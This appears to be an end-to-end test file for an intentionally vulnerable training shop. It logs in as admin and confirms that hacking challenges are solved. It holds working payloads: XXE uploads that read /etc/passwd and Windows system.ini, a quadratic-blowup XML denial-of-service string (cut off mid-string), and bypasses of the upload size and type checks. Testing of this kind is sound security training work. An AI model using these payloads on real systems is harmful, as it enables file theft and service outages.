const config = require('config')

describe('/#/complain', () => {
  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  describe('challenge "uploadSize"', () => {
    it('should be possible to upload files greater 100 KB', () => {
      browser.ignoreSynchronization = true
      browser.executeScript(() => {
        const over100KB = Array.apply(null, new Array(11000)).map(String.prototype.valueOf, '1234567890')
        const blob = new Blob(over100KB, { type: 'application/pdf' })

        const data = new FormData()
        data.append('file', blob, 'invalidSizeForClient.pdf')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.wait(1000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({ challenge: 'Upload Size' })
  })

  describe('challenge "uploadType"', () => {
    it('should be possible to upload files with other extension than .pdf', () => {
      browser.ignoreSynchronization = true
      browser.executeScript(() => {
        const data = new FormData()
        const blob = new Blob([ 'test' ], { type: 'application/x-msdownload' })
        data.append('file', blob, 'invalidTypeForClient.exe')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.wait(1000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({ challenge: 'Upload Type' })
  })

  describe('challenge "xxeFileDisclosure"', () => {
    if (process.platform === 'win32') {
      it('should be possible to retrieve file from Windows server via .xml upload with XXE attack', () => {
        browser.ignoreSynchronization = true
        browser.executeScript(() => {
          const data = new FormData()
          const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
          data.append('file', blob, 'xxeForWindows.xml')

          const request = new XMLHttpRequest()
          request.open('POST', '/file-upload')
          request.send(data)
        })
        browser.driver.wait(1000)
        browser.ignoreSynchronization = false
      })
      protractor.expect.challengeSolved({ challenge: 'Deprecated Interface' })
      protractor.expect.challengeSolved({ challenge: 'XXE Tier 1' })
    }

    if (process.platform === 'linux' || process.platform === 'darwin') {
      it('should be possible to retrieve file from Linux server via .xml upload with XXE attack', () => {
        browser.ignoreSynchronization = true
        browser.executeScript(() => {
          const data = new FormData()
          const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
          data.append('file', blob, 'xxeForLinux.xml')

          const request = new XMLHttpRequest()
          request.open('POST', '/file-upload')
          request.send(data)
        })
        browser.driver.wait(1000)
        browser.ignoreSynchronization = false
      })
      protractor.expect.challengeSolved({ challenge: 'Deprecated Interface' })
      protractor.expect.challengeSolved({ challenge: 'XXE Tier 1' })
    }
  })

  describe('challenge "xxeDos"', () => {
    if (process.platform === 'win32') {
      it('should be possible to trigger request timeout via .xml upload with Quadratic Blowup attack', () => {
        browser.ignoreSynchronization = true
        browser.executeScript(() => {
          const data = new FormData()
          const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY a "dosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdos" 